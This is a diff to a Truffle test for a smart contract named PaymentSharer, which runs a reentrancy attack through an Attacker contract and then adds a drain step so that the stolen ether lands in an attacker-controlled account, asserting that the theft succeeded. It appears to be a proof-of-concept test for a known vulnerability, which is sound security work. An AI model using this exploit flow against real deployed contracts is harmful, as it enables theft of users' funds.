@@ -42,10 +42,10 @@ contract('PaymentSharer', function(accounts) {
   });
 
   it("Test Reentrancy", async function() {
-    var p = await PaymentSharer.deployed();
-    var a = await Attacker.new();
-    const innocent = accounts[4];
     const attacker_controlled = accounts[3];
+    var p = await PaymentSharer.deployed();
+    var a = await Attacker.new({from: attacker_controlled});
+    const innocent = accounts[4];
     await p.init(0, a.address, attacker_controlled);
     var tx = await p.updateSplit(0, 1);
     var attacker_balance_start = new BN(await web3.eth.getBalance(a.address)).add(new BN(await web3.eth.getBalance(attacker_controlled)));
@@ -55,7 +55,8 @@ contract('PaymentSharer', function(accounts) {
     var attacker_balance_mid = new BN(await web3.eth.getBalance(a.address)).add(new BN(await web3.eth.getBalance(attacker_controlled)));
     console.log("Balance mid attack:    ", attacker_balance_mid.toString());
     await a.attack(p.address);
-    var attacker_balance_end = new BN(await web3.eth.getBalance(a.address)).add(new BN(await web3.eth.getBalance(attacker_controlled)));
+    await a.drain();
+    var attacker_balance_end = new BN(await web3.eth.getBalance(attacker_controlled));
     console.log("Balance after attack:  ", attacker_balance_end.toString());
     assert(attacker_balance_start.lt(attacker_balance_end), "Didn't manage to steal");
   });
